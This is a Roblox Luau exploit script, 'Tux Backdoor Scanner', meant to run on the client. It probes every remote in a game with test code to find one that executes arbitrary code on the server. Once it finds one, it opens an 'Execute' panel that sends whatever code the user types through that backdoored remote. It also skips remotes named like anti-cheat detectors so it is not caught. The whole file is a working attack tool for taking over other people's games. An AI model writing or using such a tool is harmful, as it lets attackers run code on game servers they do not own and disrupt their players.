--[========================================================================[
	  ______              ____             __       __                    _____                                 
	 /_  __/_  ___  __   / __ )____ ______/ /______/ /___  ____  _____   / ___/_________ _____  ____  ___  _____
	  / / / / / / |/_/  / __  / __ `/ ___/ //_/ __  / __ \/ __ \/ ___/   \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
	 / / / /_/ />  <   / /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /      ___/ / /__/ /_/ / / / / / / /  __/ /    
	/_/  \__,_/_/|_|  /_____/\__,_/\___/_/|_|\__,_/\____/\____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/ v1.0.0    

	Tux, the best backdoor scanner in Roblox.
    Copyright (C) 2025 - C:\Drive
	
    This program is free software: you can redistribute it and/or modify
    it under the terms of the TUX General Public License.
    	
	This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
    TUX General Public License for more details.

    Contact:
    For any questions, please reach out to me on discord at:
    @humanoid.root.part
     	
    Or you can ping me in my discord server:
    .gg/Sf8YXxgp

    Tux Backdoor Scanner v1.0.0
    Last Updated: 9 / 6 / 2025
--]========================================================================]

local lp: Player = game:GetService("Players").LocalPlayer

local config = {
	mode = "Normal", --# "Fast" = Wait time becomes faster | "Normal" = Wait time is normal | "Slow" = Wait time is the slowest
	scanforfunctions = true, --# Scans for "RemoteFunctions" along side "Remote Events"
	coregui = false, --# Puts the GUI in the CoreGui
}

local blacklistedstrings = {"CheatDetected","ExploitDetected"} --# Table full of likely names that are a anti-exploit remote
local holygrail: RemoteEvent | RemoteFunction = nil --# The remote that is backdoored, set to nil by default
local testcode: string = "a=Instance.new(\"Part\",workspace)a.Name=\"MrBlock_7101\"" --# The code that will determine if the remote is backdoored

local waittime: number = 0.1 --# The time that the script waits between each remote, will bechanged based on the config

if config.mode:lower() == "Fast" then --# You should be able to understand this, right?
	waittime = 0.05
elseif config.mode:lower() == "Normal" then
	waittime = 0.1
elseif config.mode:lower() == "Slow" then
	waittime = 0.25
end

local function makenotif(title, text, duration)
	game.StarterGui:SetCore("SendNotification", {
		Title = title or "Tux Backdoor Scanner", --# Title of the notification
		Text = text or "Enjoy!", --# Description of the notification
		Duration = duration or 1, --# Duration of the notification
	})
end

local function fire(rem,code)
	if rem:IsA("RemoteEvent") then --# Checks if the remote is a "RemoteEvent"
		rem:FireServer(code) --# Fires the remote
	elseif rem:IsA("RemoteFunction") then --# Checks if the remote is a "RemoteFunction"
		rem:InvokeServer(code) --# Invokes the remote
	end
end

local function testremote(remote)
	fire(remote,testcode)
	task.wait(waittime)
	if workspace:FindFirstChild("MrBlock_7101") then --# Checks if the part exists
		return true --# If its found then the game is backdoored
	end
	return false --# If its not then then the script keeps searching until there is a remote or the game isn't backdoored
end

task.wait() --# Gives it time to process everything

for _, r in ipairs(game:GetDescendants()) do --# Recursively checks through every instance in the game
	if r.Parent == nil then continue end --# Makes sure that the remote has a parent
	if r.Parent.Name == "RobloxReplicatedStorage" --# Makes sure that the remote isn't from ROBLOX
		or r.Parent.Name == "DefaultChatSystemChatEvents" then continue end --# Same thing

	if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then --# Makes sure that the Instance is a "RemoteEvent" or "RemoteFunction"
		if string.find(r.Name,#blacklistedstrings) then --# Then it checks if the remote's name is blacklisted
			continue --# If so it skips that remote
		else
			if testremote(r) then --# Tests the remote and if the function comes back true then it sets the holygrail variable to the remote
				warn("Tux Backdoor Scanner: "..r.Name.." | IsBackdoored: true")
				makenotif("Tux Backdoor Scanner", "Backdoor found! ( Name: "..r.Name.." )", 5)  --# Sends a notification
				holygrail = r --# Sets the remote to the holygrail variable
				break --# Breaks the loop
			end
			print("Tux Backdoor Scanner: "..r.Name.." | IsBackdoored: false")
		end
	end
	
	if not holygrail then
		warn("Tux Backdoor Scanner: No backdoors found!") --# Prints that the game isn't backdoored
		makenotif("Tux Backdoor Scanner", "No backdoors found!", 5) --# Sends a notification saying that the game isn't backdoored
	end
end

repeat wait(0.1) until holygrail --# Waits until the holygrail variable is set to a remote, then setups the GUI

--# Gui Setup
---# I'm sorry but I'm not making comments for every single line of code, forgive me skids

local sgui = Instance.new("ScreenGui")

if config.coregui then
	sgui.Parent = game:GetService("CoreGui")
else
	sgui.Parent = lp.PlayerGui
end

sgui.ResetOnSpawn = false
sgui.IgnoreGuiInset = true
sgui.DisplayOrder = 2147483647
sgui.Name = "Tux v1.0.0"

local mainframe = Instance.new("Frame",sgui)
mainframe.AnchorPoint = Vector2.new(0.5,0.5)
mainframe.Position = UDim2.new(0.5,0,0.5,0)
mainframe.Size = UDim2.new(0,300,0,200)
mainframe.BackgroundTransparency = 0.25
mainframe.BackgroundColor3 = Color3.new(0,0,0)
mainframe.BorderSizePixel = 0
mainframe.ClipsDescendants = true
mainframe.Name = "MainFrame"

local uicorner = Instance.new("UICorner",mainframe)
local drag = Instance.new("UIDragDetector",mainframe)

local title = Instance.new("TextLabel",mainframe)
title.ZIndex = 2
title.BackgroundTransparency = 1
title.Size = UDim2.new(1,-10,0,24)
title.Position = UDim2.new(0,0,0,5)
title.Text = "  Tux v1.0.0"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Name = "Title"

local codebox = Instance.new("TextBox",mainframe)
codebox.BackgroundTransparency = 0.5
codebox.Size = UDim2.new(1,-10,0,125)
codebox.Position = UDim2.new(0,5,0,35)
codebox.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
codebox.Text = ""
codebox.PlaceholderText = "--# Made by C:\\Drive <3"
codebox.TextColor3 = Color3.new(1,1,1)
codebox.TextSize = 16
codebox.Font = Enum.Font.Code
codebox.TextXAlignment = Enum.TextXAlignment.Left
codebox.TextYAlignment = Enum.TextYAlignment.Top
codebox.ClearTextOnFocus = false
codebox.BorderSizePixel = 0
codebox.Name = "CodeBox"

local uicorner2 = Instance.new("UICorner",codebox)

local button = Instance.new("TextButton",mainframe)
button.BackgroundTransparency = 0.5
button.Size = UDim2.new(1,-10,0,28)
button.AnchorPoint = Vector2.new(0.5,0)
button.Position = UDim2.new(0.5,0,1,-34)
button.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
button.Text = "Execute"
button.TextColor3 = Color3.new(1,1,1)
button.TextScaled = true
button.Font = Enum.Font.SourceSansBold
button.BorderSizePixel = 0
button.Name = "ExecuteButton"

local uicorner3 = Instance.new("UICorner",button)

button.MouseButton1Click:Connect(function() --# Execute button click event
	fire(holygrail,codebox.Text) --# Fire the remote with the codebox text
end)

---# End of script
--# .gg/Sf8YXxgp
